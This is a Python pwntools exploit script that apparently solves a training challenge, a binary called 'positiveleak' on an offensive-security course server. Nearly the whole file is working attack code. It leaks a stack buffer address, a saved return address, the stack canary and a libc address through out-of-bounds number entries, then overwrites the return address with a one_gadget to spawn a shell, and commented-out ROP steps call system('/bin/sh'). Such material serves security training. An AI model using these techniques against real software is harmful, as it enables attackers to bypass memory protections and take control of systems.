from pwn import *
import time
import subprocess
import sys
import warnings
import re

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

def leak_buffer(r):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"0") # add 0 numbers
    time.sleep(0.2)
    r.sendline(b"")
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    buffer = int(r.recvlineS(keepends=False)) - 0x70
    r.recvrepeat(timeout=0.2)
    return buffer

def leak_sRIP_main(r):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"1") # add 1 numbers
    time.sleep(0.2)
    r.sendline(b"")
    time.sleep(0.2)
    r.sendline(b"")
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    r.recvline()
    sRIP_main = int(r.recvlineS(keepends=False)) + 0x027e
    r.recvrepeat(timeout=0.2)
    return sRIP_main

def leak_canary(r, buffer):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"14") # add 14 numbers
    time.sleep(0.2)
    for i in range(9):
        r.sendline(b"")
        time.sleep(0.2)
    r.sendline(b"42949672959")  # i = 9
    time.sleep(0.2)
    r.sendline(b"60129542143")  # temp_numbers = 13
    time.sleep(0.2)
    r.sendline(b"")             # number
    time.sleep(0.2)
    r.sendline(str(buffer).encode())
    time.sleep(0.2)
    r.sendline(b"-1")           # im on top of the canary but I dont want overwrite it
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    r.recvlines(13)
    canary = int(r.recvlineS(keepends=False))
    r.recvrepeat(timeout=0.2)
    return canary

def leak_libc(r, buffer, canary, sRIP):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"14")                   # add 14 numbers
    time.sleep(0.2)
    for i in range(9):
        r.sendline(b"")
        time.sleep(0.2)
    r.sendline(b"42949672959")          # i = 9
    time.sleep(0.2)
    r.sendline(b"77309411327")          # temp_numbers = 17
    time.sleep(0.2)
    r.sendline(b"")                     # number
    time.sleep(0.2)
    r.sendline(str(buffer).encode())    # buffer
    time.sleep(0.2)
    r.sendline(str(canary).encode())    # canary
    time.sleep(0.2)
    r.sendline(b"")                     # sRBP (main)
    time.sleep(0.2)
    r.sendline(str(sRIP).encode())      # sRIP (main)
    time.sleep(0.2)
    r.sendline(b"")                     # sRBP (__libc_call_main)
    time.sleep(0.2)
    r.sendline(b"-1")                   # on top of sRIP (__libc_call_main)
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    r.recvlines(17)
    leak_libc = int(r.recvlineS(keepends=False))
    r.recvrepeat(timeout=0.2)
    return leak_libc

one_gadget=0x00
if args["ONE_GADGET"]:
    one_gadget = args["ONE_GADGET"]

if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 3003)
else:
    r = process("./positiveleak")

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"

# breakpoints

#gadgets
pop_rdi = 0x2a3e5
pop_rax_rdx_rbx = 0x90528
pop_rsi = 0x2be51
syscall = 0x29db4
bin_sh = 0x1d8698


buffer = leak_buffer(r)
sRIP_main = leak_sRIP_main(r)
canary = leak_canary(r, buffer)
leak_libc = leak_libc(r, buffer, canary, sRIP_main)
libc_one_gadget = leak_libc + 0x26ca7
libc_system = leak_libc + 0x26fd0 
libc_bin_sh = leak_libc + 0x1ae908
libc_pop_rdi = leak_libc + 0x655
libc_pop_rax_rdx_rbx = leak_libc + 0x66798
libc_pop_rsi = leak_libc + 0x20c1
libc_syscall = leak_libc + 0x24
print("buffer:\t", hex(buffer))
print("sRIP:\t", hex(sRIP_main))
print("canary:\t", hex(canary))
print("leak_libc:\t", hex(leak_libc))

r.sendline(b"0")
time.sleep(0.2)
r.sendline(b"14")                   # add 14 numbers
time.sleep(0.2)
for i in range(9):
    r.sendline(b"")
    time.sleep(0.2)
r.sendline(b"42949672959")          # i = 9
time.sleep(0.2)
r.sendline(str(0x13ffffffff).encode())         # temp_numbers = 17
time.sleep(0.2)
r.sendline(b"")                     # number
time.sleep(0.2)
r.sendline(str(buffer).encode())    # buffer
time.sleep(0.2)
r.sendline(str(canary).encode())    # canary
time.sleep(0.2)
r.sendline(b"")                     # sRBP (main)
time.sleep(0.2)
r.sendline(str(libc_one_gadget).encode())   # sRIP (main) / gadget
#r.sendline(str(libc_pop_rdi).encode())   # sRIP (main) / gadget
#time.sleep(0.2)
#r.sendline(str(libc_bin_sh).encode())
#time.sleep(0.2)
#r.sendline(str(libc_system).encode())
#time.sleep(0.2)

r.interactive()
